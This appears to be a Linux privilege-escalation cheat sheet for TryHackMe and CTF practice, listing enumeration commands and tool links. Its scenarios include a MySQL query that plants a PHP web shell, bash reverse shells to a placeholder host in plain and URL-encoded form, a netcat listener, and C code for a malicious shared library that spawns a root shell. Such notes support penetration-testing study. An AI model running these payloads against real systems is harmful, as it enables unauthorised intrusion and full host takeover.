# [Linux Privilege Escalation](https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Linux-Privilege-Escalation.md)

[GTFOBins](https://gtfobins.github.io/)

[Linux Kernerl CVEs](https://www.linuxkernelcves.com/cves)

[Rapid7](https://www.rapid7.com/)

[ExploitDB](https://www.exploit-db.com/)

- [Searchsploit - ExploitDB in CLI](https://www.kali.org/tools/exploitdb/)

- [MySQL - User-Defined Function (UDF)](https://www.exploit-db.com/exploits/1518)

## Linux Privilege Escalation Scripts

[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

[LinEnum](https://github.com/rebootuser/LinEnum)

[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

[Linux Priv Checker](https://github.com/linted/linuxprivchecker)

[Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

[Linux Exploit Suggester 2 & Dirty Cow](https://github.com/Haxxenigma/TryHackMe/tree/main/Linux-PrivEsc-Scripts/kernel-exploits)

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

- [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

[pentestmonkey — php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

## Enumeration

### General

`hostname`

`uname [-a]`

`cat /proc/version`

`cat /etc/issue`

`sudo [-l]`

`ls [-la]`

`id [user]`

`history`

`ifconfig`

`ip route`

`cat /etc/passwd | cut -d : -f 1 | grep home`

`env`: show environmental variables.

### ps

`ps -A`: view all processes.

`ps axjf`: view process tree.

`ps aux`: all with tty, including other users (a), user-oriented format (u), processes without controlling ttys (x).

### netstat

`netstat -a`: display all sockets (default: connected).

`netstat -t` or `netstat -u`: for TCP or UDP protocols.

`netstat -l`: display listening server sockets.

`netstat -s`: display networking statistics.

`netstat -p`: display PID/Program name for sockets.

`netstat -i`: display interface table.

`netstat -ano`: Most often usage.

`-a`: display all sockets.

`-n`: don't resolve names.

`-o`: display timers.

### 2>/dev/null

`2>/dev/null` use this to redirect errors to “/dev/null” and have a cleaner output.

### find

`find /home -name flag1.txt`: find the file named "flag1.txt” in the /home directory.

`find / -type d -name config`: find the directory named "config" under “/”.

`find / -type f -perm 0777`: find files with the 777 permissions.

`find / -perm a=x`: find executable files.

`find /home -user frank`: find all files for user “frank” under “/home”.

`find / -mtime 10`: find files that were modified in the last 10 days.

`find / -atime 10`: find files that were accessed in the last 10 days.

`find / -cmin -60`: find files changed within the last 60 minutes.

`find / -amin -60`: find files accesses within the last 60 minutes.

`find / -size 50M`: find files with a 50 MB size (can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size).

<br>

Folders and files that can be written to or executed from:

`find / -writable -type d`: Find world-writeable folders.

`find / -perm -222 -type d`: Find world-writeable folders.

`find / -perm -o w -type d`: Find world-writeable folders.

`find / -perm -o x -type d`: Find world-executable folders.

`find / -perm -u=s -type f`: Find files with the SUID bit, which allows the file to run with the privilege level of the account that owns it, rather than the account which runs it.

<br>

Find development tools and supported languages:

`find / -name perl*`

`find / -name python*`

`find / -name gcc*`

### locate

`locate [OPTION] PATTERN`: searches for files.

### grep

`grep [OPTION] PATTERN [FILE]`: search for PATTERNS in each FILE.

### awk

`awk <options> '<condition> {<action>} ... [<condition> {<action>}]'`

- *Options*:

    `-F`, `--field-separator=fs`: field separator

    `-f`, `-–file`: read data not from standard output, but from a file

- *Actions*:

    `print(string)`: output to standard output stream

    `printf(string)`: formatted output to standard output stream

    `system(command)`: executes a command in the system

    `length(string)`: returns the length of the string

    `substr(string, start, quantity)`: truncates the string and returns the result

    `tolower(string)`: converts the string to lowercase

    `toupper(string)`: convert the string to uppercase

- *Operators*:

    `$`: link to the column by number

    `FNR`: number of the processed line in the file

    `FS`: field separator

    `NF`: the number of columns in this row

    `NR`: the total number of lines in the processed text

    `RS`: line separator, by default a newline character

- *Example*:

    - Get first column:

        `cat test.txt | awk '{print $1}'`

    - Get last column:

        `cat test.txt | awk '{print $NF}'`

    - Get penultimate column:

        `cat test.txt | awk '{print $(NF-1)}'`

    - Get middle column:

        `cat test.txt | awk '{print $((NF/2)+1)}'`

### cut

`cut OPTION [FILE]`: print selected parts of lines from each FILE to standard output.

`-b`: select only these bytes.

`-c`: select only these characters.

`-f`: select only these fields. Also print any line
that contains no delimiter character, unless
the -s option is specified.

`-d`: use DELIM instead of TAB for field delimiter.

### sort

`sort [OPTION] [FILE]`: sorted concatenation of all FILE(s) to standard output.

# Scenarios

## Scenario 1 (Bash Reverse Shell)

- SNMP Brute Script

    ```shell
    nmap -sU -p161 -sV --script=snmp-brute <ip>
    ```

- SNMP Processes Script

    ```shell
    nmap -sU -p161 --script=snmp-processes <ip>
    ```

- Interact with MySQL Server

    ```shel
    mysql -u <user> -p<pass> -h <ip>
    ```

- Check whether MySQL service can be leveraged to write into the web root directory

    ```sql
    select "<?php system($_GET['cmd'])?>" into outfile "/var/www/html/shell.php";
    ```

- Access the webshell

    ```shell
    curl http://<ip>/shell.php?cmd=id
    ```

- Bash Reverse Shell

    ```shell
    bash -i >& /dev/tcp/<ip>/<port> 0>&1
    ```

- Bash Reverse Shell Command

    ```shell
    /bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
    ```

- URL Encoded Bash Reverse Shell Command

    ```shell
    %2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F%3Cip%3E%2F%3Cport%3E%200%3E%261%27
    ```

- Execute Bash Reverse Shell Command

    ```shell
    curl 'http://<ip>/shell.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F%3Cip%3E%2F%3Cport%3E%200%3E%261%27'
    ```

- [netcat](https://www.kali.org/tools/netcat/)

    ```shell
    rlwrap nc -vnlp 53
    ```

- Upgrade the shell to a fully interactive shell

    ```shell
    python -c 'import pty; pty.spawn("/bin/bash");'
    ```

    ```shell
    Ctrl + Z
    ```
    
    ```shell
    stty raw -echo
    ```
    
    ```shell
    fg
    ```

## Scenario 2 (SUID binaries & shared libs)

- Search for SUID binaries on the system

    ```shell
    find / -perm -u=s -type f 2>/dev/null
    ```

- execute binary

- Identify *the writable directory* among the *shared library paths*

- Write the c program for malicious shared library

    ```c
    #include<stdio.h>
    #include<stdlib.h>
    #include<unistd.h>

    int welcome(){
        setuid(0);
        setgid(0);
        system("/bin/bash");
    }
    ```

- Compile the shared library

    ```shell
    gcc -shared -o scrypt.so -fPIC scrypt.c
    ```

- Execute `scrypt.so`

## Crontab

[Crontab Generator](https://crontab-generator.org/)

[Crontab Guru](https://crontab.guru/)

```shell
crontab -e
```

## Other cheatsheets

<https://github.com/Rajchowdhury420/CTF-CheatSheet>

<https://dvd848.github.io/CTFs/CheatSheet.html>

<https://github.com/JohnHammond/ctf-katana>

<https://github.com/apsdehal/aWEsoMe-cTf>